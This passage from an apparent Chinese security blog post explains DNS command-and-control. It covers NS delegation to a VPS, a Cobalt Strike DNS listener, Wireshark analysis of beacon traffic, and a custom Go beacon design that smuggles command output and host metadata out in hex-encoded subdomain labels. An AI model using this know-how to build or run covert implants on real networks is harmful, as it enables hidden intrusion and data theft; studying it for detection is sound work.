<p><strong>这里明确一点</strong>：主机记录都是域名，记录值可以是ip地址也可以是域名或者其他，主要看记录类型。</p>
<p>来到 <code>云解析DNS</code> -&gt; <code>解析配置</code> -&gt; <code>公网权威解析</code>，添加记录</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/13-02-12-42ef32dd92e9c823a8fba4c95fd7138e-20250905130212-3f134e.png"></p>
<p>增加一条A记录，将主机记录随意填，记录值为vps的公网ip地址，这样做的效果是 <code>ns1.example.com</code> -&gt; <code>vps的公网ip</code> </p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/13-02-53-d3ad859ee71487a475ec171f25504500-20250905130253-97a291.png"></p>
<p>增加一条NS记录，主机记录随意填比如说 <code>1</code>，记录值为A记录的主机记录 <code>ns1.example.com</code>，这样做的效果是任何关于 <code>1.example.com</code> 及其子域的DNS查询都将委托给域名为 <code>ns1.example.com</code> 的DNS服务器解析。而 <code>ns1.example.com</code> 正是再上一步操作中增加的A记录，也就意味着 <code>1.example.com</code> 及其子域是交由我们的vps来处理。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/13-03-43-b3d4cfc86209efdfcc0d95d03bb502d6-20250905130342-a19008.png"></p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/13-04-17-ff22d47773fedcfdfe1f46c6543bb690-20250905130417-ccb77f.png"></p>
<p>完成后，任何形如 <code>*.1.example.com</code> 的查询，递归服务器都会转给 <code>ns1.example.com</code> → <code>vps的公网ip</code>；VPS只需在53上跑权威DNS（Cobalt Strike&#x2F;Sliver&#x2F;自写脚本皆可），即可接管该子域的所有解析请求，从而达到命令与控制的效果！</p>
<p>注册完后的DNS记录需要等待10分钟后才能生效，我们可以使用nslookup或者dig来测试A记录是否生效，NS记录也是同理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup ns1.example.com</span><br></pre></td></tr></table></figure>

<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/13-05-24-1a40f3932ebb4547b62dbcc9edde780a-20250905130524-4eaa18.png"></p>
<h3 id="（二）创建DNS监听器并完成上线"><a href="#（二）创建DNS监听器并完成上线" class="headerlink" title="（二）创建DNS监听器并完成上线"></a>（二）创建DNS监听器并完成上线</h3><p>是时候请出CS老祖了，我使用的是CS4.9.1进行测试，在涉及源码分析的时候用的是4.5，请注意区分！在vps上启动CS服务器，然后创建DNS监听器，最后进行如下配置</p>
<ul>
<li><code>DNS Hosts</code>：NS记录的域名</li>
<li><code>DNS Host (Stager)</code>：在DNS Hosts列表中随便挑选一个NS记录的域名。</li>
</ul>
<p>参数的说明在cs官网：<a target="_blank" rel="noopener" href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructure_beacon-dns.htm#_Toc65482739">DNS 信标</a></p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/13-05-45-09aec0fb1786df0684d841ef6b8787e6-20250905130544-1ee14d.png"></p>
<p>上线后，会话表里主机图标显示黑色，无信息，且不能执行除 <code>checkin</code> 命令之外的任何命令。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/04/21-05-02-8bdb65447b3f57b9f8938810e19a9ac0-20250904210501-dcb8a3.png"></p>
<p>输入 <code>checkin</code> 命令，强制让目标主机返回metadata, 这样主机信息就会显现出来。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/04/21-15-38-8b95c6bfdcb7a6f35e88f9a7a68d1d18-20250904211538-dcbd49.png"></p>
<p>正常执行命令</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/04/21-18-45-64913f652b8156ebf357440d20736f7e-20250904211844-8876de.png"></p>
<p>DNS Beacon支持三种不同模式的传输数据的方式，可以输入命令进行切换</p>
<ul>
<li><code>mode dns</code>：使用DNS A记录作为数据通道，A记录最常见，最不显眼，但是携带的数据量最有限（4byte）</li>
<li><code>mode dns-txt</code>：使用DNS TXT记录作为数据通道，TXT查询较为少见，易触发IDS统计，携带数据量最多（与双方的约定有关，受多方因素制约），大部分场景用这种模式就行</li>
<li><code>mode dns6</code>：使用DNS AAAA记录作为数据通道，AAAA记录逐渐常见，携带数据量一般（16 byte）</li>
</ul>
<p>⚠注意：上述三种方式仅决定 <strong>Server→Beacon的任务数据如何封装</strong>，Beacon的上传数据仍通过子域标签组合完成回传，在下文 <code>4.3 思路构建</code> 会详细说明DNS C2的实现思路。</p>
<h3 id="（三）流量分析"><a href="#（三）流量分析" class="headerlink" title="（三）流量分析"></a>（三）流量分析</h3><p>最后看看wireshark的流量，我们编写一个过滤规则，只查看相关的dns数据包。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns and dns.qry.name contains &quot;1.abcplus.xyz&quot;</span><br></pre></td></tr></table></figure>

<p>首先是上线的流量，可以看到NS记录 <code>1.abcplus.xyz</code> 与agentId <code>303c2df6</code> 组成了待查询的子域 <code>303c2df6.1.abcplus.xyz</code>，后续的每一个DNS查询都要带上agentId。每过完一个 <code>sleep</code> 时间都会向server发送一次这样的查询，目的是证明beacon还活着。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/14-07-24-5cb8ebe35c9a6c51f4363c0a783b692e-20250905140723-485595.png"></p>
<p>下图是4.5 Beacon源码的 <code>genagentid</code> 函数。不同版本的cs <code>genagentid</code> 函数的算法可能不一样！</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/14-53-31-7c3ab11d5645e21f43e7e8bd5f5fd347-20250905145330-9d2abe.png"></p>
<p>下图是4.5 客户端用于校验beaconid的 <code>isDNSBeacon</code> 函数</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/14-58-58-ae08a3a9966da4f803e29e898aa344a0-20250905145858-4dfbfb.png"></p>
<p>使用A记录DNS查询去拉取任务时，server会返回信号用于控制beacon的行为，具体来说就是server返回的ip转换成32位的整数，然后与dnsidle异或，得到真正的控制信号。</p>
<ul>
<li>如果控制信号为0（ip为0.0.0.0），就意味着团队服务器的任务队列中没有需要该beacon执行的任务；</li>
<li>如果控制信号为<code>240~245</code>（ip为<code>0.0.0.240~245</code>），就要根据控制信号去来检查需要执行的任务。就比如说控制信号为242，就表明要用TXT查询去获取任务数据和处理任务数据。</li>
</ul>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/15-09-20-26f0387479b6045415f2380b3d08b016-20250905150920-7dc55e.png"></p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/24/20-59-19-9c7f5019da5136a535bb1d7234688a42-20250924205919-679701.png"></p>
<p>执行 <code>checkin</code> 命令，以www作为前缀的子域在域名中携带了主机信息（metadata），也就是我们常说的心跳包。见下图看流量。</p>
<ul>
<li>第一个www前缀的域名表明了接下来的server要接收来自beacon的回传数据长度，其中 <code>180</code> 的解释：1表示用1个标签去传输这个数据，<code>80</code> 表示16进制表示的数据长度， <code>80</code> 只有两个字符，所以只用1个标签就能传输</li>
<li>后面两个就是要回传的数据了</li>
</ul>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/13-38-13-f6a6476a04af82c365cfe741abc79e6d-20250905133813-b54407.png"></p>
<p>来看看beacon源码是怎么定义回传结果的模板，主要是这个语句 <code>_snprintf(c2domain, 1024, &quot;%s1%x.%x%x.%s&quot;, type, length, reqno, nonce, domain);</code>，即 <code>&lt;type&gt;1&lt;len&gt;.&lt;reqno&gt;.&lt;nonce&gt;.&lt;domain&gt;</code></p>
<ul>
<li><code>&lt;type&gt;</code> 是前缀（如api、www、post），代码中是有定义的</li>
</ul>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/17-11-10-d8edb3baed4d95240bf73074a31c2358-20250905171109-c818bb.png"></p>
<ul>
<li>只用1个标签，就能传输“总字节数”。</li>
<li><code>&lt;len&gt;</code> 是<strong>总字节数</strong></li>
<li><code>reqno</code>：序号，逐包递增，<strong>防止DNS缓存命中</strong>。</li>
<li><code>nonce</code>：它是一个随机数，用来唯一标识请求。</li>
<li><code>domain</code>：NS记录。</li>
</ul>
<p>⚠注意：可以看到下图中前缀后面没有跟着 <code>.</code>，而wireshark后面是跟着的，即 <code>www.</code>，这是什么原因我也不是很懂，在后面的 <code>4.4 代码实现</code> 中我是以带 <code>.</code>  为标准的做法。下图是长度是鞋带长度的域名</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/15-31-55-4a197d71f16c5ede1e227f8fd620dccf-20250905153155-2a152a.png"></p>
<p>对于鞋带数据的域名如何构造，我先按下不表，等到了 <code>4.4 代码实现</code> 我在详细说明。</p>
<p>以api作为前缀的域名应该是与任务相关的操作吧，beacon首先发起A记录查询，server用 <code>0.0.0.48</code> 将信息返回给beacon，其中ip地址最后的48代表某种命令含义，这个我不是很了解，因为不是重写一个CS的Beacon，所以并不关心它代表什么含义。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/13-39-28-873b5e8d57b6f06da1a58d048ad0d762-20250905133927-f70932.png"></p>
<p>最后的TXT记录类型查询 <code>api.*</code> 子域就是获取任务数据。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/16-30-35-f2227a7ae36125c28dfe2fe25609ce5f-20250905163035-4a119e.png"></p>
<p>执行 <code>ls</code> 命令，beacon执行完命令后，会以post作为前缀的域名回传的执行结果，结果如何构造在下文的 <code>4.4 代码实现</code> 详细说明。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/16-36-39-92b2d1759e9b703a59224f3cffb93f84-20250905163638-8fc8b9.png"></p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/16-37-07-da038c838889589aec5595abb9ad0059-20250905163707-627cc3.png"></p>
<h3 id="（四）需要注意的点"><a href="#（四）需要注意的点" class="headerlink" title="（四）需要注意的点"></a>（四）需要注意的点</h3><p><strong>①放行udp 53的入端口</strong></p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/04/21-42-21-ec230678cffdf4893d56336d825b4d63-20250904214221-ac514a.png"></p>
<p><strong>②53端口被占用</strong></p>
<p><strong>Ubuntu 16.10（2016 年 10 月）</strong> 开始，官方默认把本地DNS解析交给 <strong>systemd-resolved</strong> 服务，我们需要关闭它，请以root权限运行下面命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop systemd-resolved</span><br></pre></td></tr></table></figure>

<p>测试完后记得开启，不然vps不能正常的访问外部服务（比如说下载软件包）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start systemd-resolved</span><br></pre></td></tr></table></figure>

<p><strong>③设置DNS服务器ip地址</strong></p>
<p>如果你是在虚拟机测试，请设置DNS服务器为<code>8.8.8.8</code>或者 <code>223.5.5.5</code>，不然可能会没办法上线到CS的服务器。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/11-36-45-ba14d3d2c8e6c6edb83f84a3bbfa6241-20250905113644-2b853b.png"></p>
<h2 id="4-3-思路构建"><a href="#4-3-思路构建" class="headerlink" title="4.3 思路构建"></a>4.3 思路构建</h2><p>看完上述的流量分析，我相信各位师傅肯定是有自己的思路了，那我就献丑说一下自己的思路构建。</p>
<p>一般情况下，在DNS隧道场景中，DNS查询都是由<strong>beacon-&gt;server</strong>，也就是我们常说的<strong>反向连接</strong>，这就意味着我们需要Server需先监听53端口并托管一条NS记录，例如把子域 <code>poll.example.com</code> 的权威NS指向自己（<code>ns1.example.com</code>）。Beacon每次向 <code>poll.example.com</code> 发起TXT查询时，递归服务器会循NS记录把请求<strong>转发到Server的公网 IP</strong>，然后由Server来解析子域查询，并根据子域名标签的组合来决定采取任务下发还是结果处理的操作。</p>
<p>Beacon执行完任务后需要将结果回显到服务器，这又出现了一个问题：让Server向Beacon发起DNS查询不太现实（也不是不可能），并且beacon-&gt;server方向的查询只能请求数据，并不能将数据回传给服务器。</p>
<p>好在这个困难并非不能解决，<strong>查询单条DNS域名最长253字符，单个标签最长为63个字符</strong>，减去固定的域名部分（如 <code>.c2.example.com</code>），可用于携带数据的空间非常有限，这也就意味着我们可以将执行的结果拼接在域名上，如果要回传的结果太长，就可以分片回传，然后server根据某种方式拼接成最终的结果。metadata的回传与上述同理。</p>
<p>其实server传输给beacon的任务数据也有长度限制，单条txt记录为255字节，一个DNS响应报文运行存放多个txt记录，所以最终能返回给返回beacon的任务数据的最大长度受UDP、DNS协议限制以及EDNS0的影响，最终在本文中我限制最大为4096字节。</p>
<p>我就在想，除了上面在查询的域名中携带数据之外，还要什么方式能回传数据，我也查过网上资料都没有满意的答案，最后也问过ai，让我最难崩的是它给我瞎扯。可能我描述的有些不准确，更准确的描述应该是：“这里beacon回传数据给server只能将数据编码在域名中”</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/05/17-21-25-04360e9c70e457d13a9525d6d5fef73f--I9%60ZJDIO-C565NG%600K2-8E-c187dd.png" alt="@I9&#96;ZJDIO@C565NG&#96;0K2@8E.png"></p>
<p>在beacon源码中只有dns_get_txt、dns_get6和dns_get和dns_put，哪里来的dns_put_txt和dns_put6（反正在CS4.5的源码中是没看到），而且我也做了实验（用的是CS 4.9），三种模式都试了一遍，都是在域名中回传数据。</p>
<p>为了区分<strong>任务获取</strong>和<strong>结果回显（包含metadata）</strong> 的DNS查询，我们可以规定<strong>任务获取</strong>使用 <code>TXT</code> 查询；<strong>结果回显</strong>使用 <code>A</code> 查询，更进一步区分可以在查询的域名中使用前缀，比如说 <code>www.</code> 表示回传 <code>metadata</code>；<code>api.</code> 表示任务获取；<code>post.</code> 表示结果回显。</p>
<p>值得说明的是，DNS 查询域名中<strong>允许出现的字符</strong>仅有：<br>• 数字 <code>0-9</code><br>• 英文大小写字母 <code>a-zA-Z</code><br>• 连接符 <code>-</code><br>• 点号 <code>.</code>（仅作标签分隔符）</p>
<p>因此，任何回传数据在<strong>嵌入子域之前必须先做编码</strong>，把<strong>不可见字符、大写字母、符号、二进制数据</strong>统一转换为 <strong>小写字母+数字</strong>的安全形式。示例：<code>asd.1.g34</code> 是合法域名。我们看看前辈们用那些方式编码吧，在 <a target="_blank" rel="noopener" href="https://github.com/BishopFox/sliver/blob/master/server/c2/dns.go">sliver</a> 的DNS C2用到了Base32和Base58两种编码方式，而CS Beacon只用了Hex格式的编码方式。不同编码它影响的是传输效率以及隐蔽性等方面，就比如说Base32无填充方案，一个字符对应5位数据，而HEX编码是一个字符对应4位数据，对应隐蔽性来说Base32和HEX都是数字和英文字母，除了回传数据时域名过长（最明显的特征），隐蔽性都差不多。</p>
<p>好了，说了这么多是时候总结上面的思路了：</p>
<ol>
<li><strong>核心模式</strong>：DNS Beacon采用反向连接，由Beacon主动向服务器发起DNS查询。</li>
<li><strong>任务获取</strong>：Beacon通过查询<code>TXT</code>记录来从服务器接收任务指令。</li>
<li><strong>结果回传</strong>：Beacon通过发起 <code>A</code> 查询，并将编码后的数据拼接在域名中来回传结果。</li>
<li><strong>数据分片</strong>：因域名长度限制，较长数据需被分割成多个片段传输，再由服务器重组，需要在添加序号，方便server拼接。除了回传数据因长度限制而需要分片，Server传给beacon的任务数据也要分片，因为单条txt记录最大为255字节。对于大文件传输还要实现UDP分片。</li>
<li><strong>编码必要性</strong>：为兼容域名格式，所有二进制或特殊字符数据在嵌入域名前必须进行编码，转换为仅包含数字、字母和连字符的安全格式。</li>
<li><strong>编码选择</strong>：域名数据常用Base32&#x2F;Base58和Hex编码；TXT记录中的数据则使用效率更高的Base64编码。</li>
</ol>
<p>废话少说，直接开始写代码。</p>
<h2 id="4-4-代码实现"><a href="#4-4-代码实现" class="headerlink" title="4.4 代码实现"></a>4.4 代码实现</h2><p>下面所展示的代码不包含DNS服务器将NS记录委托给监听器，而是Beacon直接连接监听器，发送DNS查询，这与实战有些区别，但是主要的逻辑框架是完整的。</p>
<p>⚠<strong>注意</strong>：我并非完全按照CS的做法编写代码，有很多地方都是 <strong>“我想这么写就这么写了”</strong> ，如果你是想重构Beacon，那么代码可能不会对你有任何帮助。</p>
<h3 id="（一）发送心跳包-Beacon"><a href="#（一）发送心跳包-Beacon" class="headerlink" title="（一）发送心跳包-Beacon"></a>（一）发送心跳包-Beacon</h3><p><strong>（1）metadata包只发送一次</strong></p>
<p>CS的做法是通过checkin命令让beacon回传metadata，使用checkin命令需要server返回ip给Beacon，Beacon解析ip得到控制信号，然后使用最后一个字节来表明用什么类型的记录去获取命令。</p>
<p>我的做法是：鉴于metadata稳定不变，我仅在上线时主动回传一次，其余情况都不传输，避免每次拉取任务都发送metadata影响速率和增大被检测的风险（频繁发送超长域名），也省去额外的控制信号交互。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/22/18-28-22-d1932865dc18e2e3f7b4b5040e477b5b-20250922182822-824f81.png"></p>
<p>既然metadata包只发送一次，要避免Beacon运行了，而Server监听器未启动导致metadata包丢失，需要有重传机制，保证metadata包一定送达到server后才进行下一步操作。这个重传机制不仅是用在发送metadata包，还可以用在回传数据包或者其他A记录查询。根据上面的思路很容易得到下面的代码，<code>channelLookupRetry_A</code> 发送A记录失败就重传，而 <code>sendA</code> 是具体实现DNS A记录查询的。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">channelLookupRetry_A</span><span class="params">(domain, dnsServer <span class="type">string</span>, retry <span class="type">int</span>)</span></span> <span class="type">uint8</span> &#123;  </span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; retry; i++ &#123;  </span><br><span class="line">       <span class="keyword">if</span> signal := sendA(domain, dnsServer); signal != SIGNAL_RETRY &#123;  </span><br><span class="line">          <span class="keyword">return</span> signal  </span><br><span class="line">       &#125;  </span><br><span class="line">       time.Sleep(<span class="number">5</span> * time.Second)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> SIGNAL_EXIT  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// sendA 成功返回 0x00~0xFC；网络层失败返回 SIGNAL_RETRY  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sendA</span><span class="params">(domain, server <span class="type">string</span>)</span></span> <span class="type">uint8</span> &#123;  </span><br><span class="line">    <span class="comment">// 创建一个新的 DNS 消息对象  </span></span><br><span class="line">    m := <span class="built_in">new</span>(dns.Msg)  </span><br><span class="line">    <span class="comment">// 设置查询的域名和类型为 A 记录  </span></span><br><span class="line">    m.SetQuestion(dns.Fqdn(domain), dns.TypeA)  </span><br><span class="line">    <span class="comment">// 启用递归查询  </span></span><br><span class="line">    m.RecursionDesired = <span class="literal">true</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 1. 建立 UDP 连接（仅本地建套接字，无网络流量）  </span></span><br><span class="line">    <span class="comment">// 尝试连接到指定的 DNS 服务器  </span></span><br><span class="line">    co, err := net.Dial(<span class="string">&quot;udp&quot;</span>, server)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> SIGNAL_RETRY  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">defer</span> co.Close() <span class="comment">// 确保函数返回前关闭连接  </span></span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 2. 给整个连接加超时  </span></span><br><span class="line">    <span class="comment">// 设置读写超时时间为 5 秒  </span></span><br><span class="line">    <span class="keyword">if</span> err := co.SetDeadline(time.Now().Add(<span class="number">5</span> * time.Second)); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> SIGNAL_RETRY  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 创建 DNS 连接对象，设置 UDP 缓冲区大小为 4096    </span></span><br><span class="line">    dnsConn := &amp;dns.Conn&#123;Conn: co, UDPSize: <span class="number">4096</span>&#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 3. 发送 DNS 查询消息  </span></span><br><span class="line">    <span class="keyword">if</span> err := dnsConn.WriteMsg(m); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> SIGNAL_RETRY  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 4. 接收 DNS 响应消息  </span></span><br><span class="line">    r, err := dnsConn.ReadMsg()  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> SIGNAL_RETRY  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 5. 打印第一条 A 记录  </span></span><br><span class="line">    <span class="comment">// 遍历响应中的所有答案  </span></span><br><span class="line">    <span class="keyword">for</span> _, ans := <span class="keyword">range</span> r.Answer &#123;  </span><br><span class="line">       <span class="comment">// 检查是否为 A 记录类型  </span></span><br><span class="line">       <span class="keyword">if</span> a, ok := ans.(*dns.A); ok &#123;  </span><br><span class="line">          <span class="comment">// 获取 IP 地址的最后一个字节作为信号  </span></span><br><span class="line">          signal := a.A.To4()[<span class="number">3</span>]   </span><br><span class="line">          fmt.Printf(<span class="string">&quot;%s  -&gt;  %s  signal=%d(0x%02X)\n&quot;</span>, domain, a.A.String(), signal, signal)  </span><br><span class="line">          <span class="keyword">return</span> signal  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> SIGNAL_RETRY <span class="comment">// 没有A记录也返回重试信号  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>（2）编码的选择</strong></p>
<p>在思路构建的时候我就说了，域名只能由数字 <code>0-9</code>  、英文大小写字母 <code>a-zA-Z</code>、连接符 <code>-</code> 、点号 <code>.</code>（仅作标签分隔符）组成，如何将二进制的数据编码成符合条件的域名组合就成了挑战。如果使用Base32编码时一定要注意使用无填充方案，即不使用“&#x3D;”填充，这是因为根据DNS标准，域名中不能带“&#x3D;”。</p>
<p>我下文中是选择使用HEX编码，利用主要还是简单，并且能抄CS DNS Beacon的实现，如果想回传更多的数据，更推荐使用Base32，这是因为Base32一个字符对应5位数据，而HEX编码一个字符对应4位数据。</p>
<p><strong>（3）档位设计</strong></p>
<p>现在为什么回答上文（三）流量分析提出的问题：<strong>回传的数据要如何构造？</strong></p>
<p><strong>按照CS的做法是</strong>：</p>
<p>使用HEX编码，每2个字符对应一个字节，每8个字符为一组，一组得到4个字节的数据，刚好对应32位（int32），一个标签最多为63个字符，也就意味着一个标签最大有7组，能携带28个字节的数据。</p>
<p>为了使传输效率最大化，单个标签应该仅能达到56个字符，当然为了使档位变化更为平滑，实际做法是同一个档位用于传输的标签的字符尽可能个数保持一致。比如说3档位需要3个标签传输数据，每个标签应该为56个字符。当然都有例外，比如4档需要4个标签，第一个标签40个字符，而后面的3个标签每个都是56个字符。详细见下表格。</p>
<p> <strong>平滑降级</strong>：档位变化平滑（如104B→84B→56B→…），根据剩余传输数据长度平滑降档。</p>
<p><strong>模板</strong>：</p>
<ul>
<li>长度：<code>www.&lt;lablecount&gt;.&lt;长度&gt;.&lt;reqno+nonce&gt;.&lt;agentid&gt;.&lt;domain&gt;</code></li>
<li>数据：<code>www.&lt;lablecount&gt;.&lt;hex-seg-1&gt;.&lt;hex-seg-2&gt;...&lt;hex-seg-N&gt;.&lt;reqno+nonce&gt;.&lt;agentid&gt;.&lt;domain&gt;</code></li>
</ul>
<table>
<thead>
<tr>
<th>档位</th>
<th>每次发送字节数</th>
<th>数据块数量</th>
<th>分组方式</th>
<th>最大域名长度估算</th>
</tr>
</thead>
<tbody><tr>
<td>4</td>
<td>104 B</td>
<td>26 组</td>
<td>5+7+7+7</td>
<td>26×8 + 固定部分 ≈ 208字符</td>
</tr>
<tr>
<td>3</td>
<td>84 B</td>
<td>21 组</td>
<td>7+7+7</td>
<td>21×8 + 固定部分 ≈ 168字符</td>
</tr>
<tr>
<td>2a</td>
<td>56 B</td>
<td>14 组</td>
<td>7+7</td>
<td>14×8 + 固定部分 ≈ 112字符</td>
</tr>
<tr>
<td>2b</td>
<td>48 B</td>
<td>12 组</td>
<td>6+6</td>
<td>12×8 + 固定部分 ≈ 96字符</td>
</tr>
<tr>
<td>2c</td>
<td>40 B</td>
<td>10 组</td>
<td>5+5</td>
<td>10×8 + 固定部分 ≈ 80字符</td>
</tr>
<tr>
<td>1a</td>
<td>28 B</td>
<td>7 组</td>
<td>7</td>
<td>7×8 + 固定部分 ≈ 56字符</td>
</tr>
<tr>
<td>1b</td>
<td>24 B</td>
<td>6 组</td>
<td>6</td>
<td>6×8 + 固定部分 ≈ 48字符</td>
</tr>
<tr>
<td>1c</td>
<td>20 B</td>
<td>5 组</td>
<td>5</td>
<td>5×8 + 固定部分 ≈ 40字符</td>
</tr>
<tr>
<td>1d</td>
<td>16 B</td>
<td>4 组</td>
<td>4</td>
<td>4×8 + 固定部分 ≈ 32字符</td>
</tr>
<tr>
<td>1e</td>
<td>12 B</td>
<td>3 组</td>
<td>3</td>
<td>3×8 + 固定部分 ≈ 24字符</td>
</tr>
<tr>
<td>1f</td>
<td>8 B</td>
<td>2 组</td>
<td>2</td>
<td>2×8 + 固定部分 ≈ 16字符</td>
</tr>
<tr>
<td>0</td>
<td>4 B</td>
<td>1 组</td>
<td>1</td>
<td>1×8 + 固定部分 ≈ 8字符</td>
</tr>
</tbody></table>
<p>可以看到上表中，每个档位都是4B的整数倍，这时你可能会有一个疑问：<strong>要传输的数据不是4B的整数倍要怎么处理？</strong></p>
<p>如果要传输的数据不是4B的整数倍，按照<strong>平滑降级</strong>原则，最终一定会是这几种情况：①剩余1B；②剩余2B；③剩余3B，按照CS的做法是<strong>你不够我就给你高位补0，来到4B大小</strong>，刚好对应最后一档。可以看到下图，初始化了一个全为0的 <code>unsigned int</code> 的data变量，所以即使要传输的数据不够4B也算按4B发送，高位还是0，不影响。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/20/18-32-12-ec8a75d4664bb4952e74e471423744b1-20250920183212-9890d3.png"></p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/20/18-30-15-8abbb32afc8bc8b08236a2bea706db23-20250920183015-51cb97.png"></p>
<p>上面已经大致介绍CS的域名构造的原理了，下面就是要介绍代码的实现，我们可以按照CS的风格写出Go语言的代码。</p>
<p>由于代码实在太多了我就不放在文章，我简要地说一下 <code>DNSPut</code> 是用来将数据回传给Server的，这些数据可以是<strong>metadata</strong> 也可以是<strong>任务执行后的结果</strong>，<code>DNSPut</code> 的主要思路是：</p>
<ol>
<li>通过 <code>length</code> 记录数据的总长度， <code>sent</code> 来记录已发送的字节数，当 <code>sent小于length</code> 作为循环条件不断地发送数据。</li>
<li>按照“<strong>贪心策略</strong>”榨干每一分长度，预定义了104、84、56、48、40、28、24、20、16、12、8、4字节这12档“套餐”，每次从<strong>大到小</strong>尝试。</li>
<li><strong>域名构造</strong>：由于档位太多且构造相似，所以我就只介绍104字节时域名的构造。具体做法是定义一个 <code>uint32</code> 类型的 <code>dataz</code> 从带发送数据copy一份固定长度数据到 <code>dataz</code> 数组中，然后按照 <code>%08x</code> 格式化数组中的每一个元素，所谓的 <code>%08x</code> 就是将32位数据按照16进制的格式输出成8个字符，比如说，<code>255</code> -&gt; <code>000000ff</code>，详见下图</li>
</ol>
